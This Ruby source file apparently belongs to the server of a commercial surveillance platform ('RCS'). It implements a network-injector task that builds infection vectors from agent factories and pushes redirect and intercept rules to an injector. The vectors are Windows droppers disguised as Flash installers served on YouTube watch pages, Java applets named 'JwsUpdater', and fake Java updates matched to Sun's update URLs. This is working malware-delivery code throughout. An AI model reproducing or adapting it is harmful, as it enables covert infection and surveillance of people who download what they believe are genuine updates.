require_relative '../tasks'

module RCS
module DB

class InjectorTask
  include RCS::DB::NoFileTaskType
  include RCS::Tracer

  def total
    injector = ::Injector.find(@params['injector_id'])
    injector.rules.where(:enabled => true).count + 2
  end
  
  def next_entry
    injector = ::Injector.find(@params['injector_id'])
    
    base = rand(10)
    progressive = 0
    redirect_user = {}
    redirect_url = []
    intercept_files = []
    vector_files = {}

    # TODO: check for release
    raise "Version too old, please update the component" if injector.version < 2012102901

    injector.rules.where(:enabled => true).each do |rule|

      # make sure to enable the scout on older rules
      if rule.scout.nil?
        rule.scout = true
        rule.save
      end

      tag = injector.redirection_tag + (base + progressive).to_s
      progressive += 1

      yield @description = "Creating rule No: #{progressive}"
      
      # use the key of the hash to avoid duplicates
      redirect_user["#{rule.ident} #{rule.ident_param}"] ||= tag

      # automatic patterns for rules
      rule.resource = 'javadl-esd.sun.com/update/1.6.0/map*1.6.0.xml' if rule.action == 'INJECT-UPGRADE'
      rule.resource = '*.youtube.com/watch*' if rule.action == 'INJECT-HTML-FLASH'

      redirect_url << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.probability} #{rule.resource}"

      case rule.action
        when 'REPLACE'
          vector_files[rule.action_param_name] = RCS::DB::GridFS.to_tmp(rule[:_grid].first)
          intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{rule.action_param_name} #{rule.resource}"

        when 'INJECT-EXE'
          # generate the cooked agent
          factory = ::Item.where({_id: rule.action_param}).first
          intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{factory.ident} #{rule.resource}"

          temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
          # generate the dropper
          params = {'factory' => {'_id' => rule.action_param},
                    'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
                    'melt' => {'admin' => true, 'cooked' => true, 'appname' => factory.ident, 'scout' => rule.scout}
                    }
          build = Build.factory(:windows)
          build.create params
          FileUtils.cp build.path(build.outputs.first), temp_zip
          build.clean

          # extract the zip
          Zip::ZipFile.open(temp_zip) do |z|
            z.each do |f|
              f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
              z.extract(f, f_path) unless File.exist?(f_path)
              vector_files[f.name] = f_path
            end
          end
          FileUtils.rm_rf(temp_zip)

        when 'INJECT-HTML-JAVA'
          appname = 'JwsUpdater' + progressive.to_s
          intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{appname} #{rule.resource}"

          temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
          # generate the applet
          params = {'factory' => {'_id' => rule.action_param},
                    'generate' => {'platforms' => ['osx', 'windows'],
                                   'binary' => {'demo' => LicenseManager.instance.limits[:nia][1], 'admin' => false},
                                   'melt' => {'admin' => false, 'scout' => rule.scout}
                                  },
                    'melt' => {'appname' => appname, 'tni' => true}
                    }
          build = Build.factory(:applet)
          build.create params
          FileUtils.cp build.path(build.outputs.first), temp_zip
          build.clean

          # extract the zip and take the applet files
          Zip::ZipFile.open(temp_zip) do |z|
            z.each do |f|
              f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
              z.extract(f, f_path) unless File.exist?(f_path)
              vector_files[f.name] = f_path
            end
          end
          FileUtils.rm_rf(temp_zip)

        when 'INJECT-HTML-FLASH'
          appname = 'FlashSetup-11.5.' + progressive.to_s
          intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{appname} #{rule.resource}"

          temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
          # generate the dropper
          params = {'factory' => {'_id' => rule.action_param},
                    'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
                    'melt' => {'admin' => false, 'appname' => appname, 'scout' => rule.scout, 'icon' => 'flash'}
                    }
          build = Build.factory(:windows)
          build.create params
          FileUtils.cp build.path(build.outputs.first), temp_zip
          build.clean

          # extract the zip
          Zip::ZipFile.open(temp_zip) do |z|
            z.each do |f|
              f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
              z.extract(f, f_path) unless File.exist?(f_path)
              vector_files[f.name] = f_path
            end
          end
          FileUtils.rm_rf(temp_zip)

        when 'INJECT-UPGRADE'
          appname = 'JavaUpdater' + progressive.to_s
          intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{appname} #{rule.resource}"

          temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
          # generate the upgrade
          params = {'factory' => {'_id' => rule.action_param},
                    'generate' => {'platforms' => ['windows'],
                                   'binary' => {'demo' => LicenseManager.instance.limits[:nia][1], 'admin' => false},
                                   'melt' => {'admin' => false, 'scout' => rule.scout}
                                  },
                    'melt' => {'appname' => appname}
                    }
          build = Build.factory(:upgrade)
          build.create params
          FileUtils.cp build.path(build.outputs.first), temp_zip
          build.clean

          # extract the zip and take the applet files
          Zip::ZipFile.open(temp_zip) do |z|
            z.each do |f|
              f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
              z.extract(f, f_path) unless File.exist?(f_path)
              vector_files[f.name] = f_path
            end
          end
          FileUtils.rm_rf(temp_zip)
      end

    end

    yield @description = "Creating binary config"

    bin_config_file = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])

    Zip::ZipOutputStream.open(bin_config_file) do |z|
      z.put_next_entry("redirect_user.txt")
      redirect_user.each_pair do |key, value|
        z.puts "#{key} #{value}"
      end

      z.put_next_entry("redirect_url.txt")
      z.puts "REDIRECT_PAGE = redirect.html"
      redirect_url.each do |value|
        z.puts value
      end

      z.put_next_entry("intercept_file.txt")
      intercept_files.each do |value|
        z.puts value
      end

      vector_files.each_pair do |filename, file|
        puts "#{filename} -> #{file}"
        z.put_next_entry("vectors/" + filename)
        z.write File.open(file, 'rb') {|f| f.read}
        FileUtils.rm_rf(file)
      end
    end

    trace :info, "Injector config file size: " + File.size(bin_config_file).to_s

    # make sure to delete the old one first
    GridFS.delete injector[:_grid].first unless injector[:_grid].nil?

    # save the binary config into the grid, it will be requested by NC later
    injector[:_grid] = [ GridFS.put(File.open(bin_config_file, 'rb+'){|f| f.read}, {filename: injector[:_id].to_s}) ]
    injector[:_grid_size] = File.size(bin_config_file)

    # delete the temp file
    FileUtils.rm_rf(bin_config_file)

    injector.configured = false
    injector.save

    yield @description = "Creating binary config"

    raise "Cannot push to #{injector.name}" unless Frontend.nc_push(injector.address)
    
    @description = "Rules applied successfully"
  end
end

end # DB
end # RCS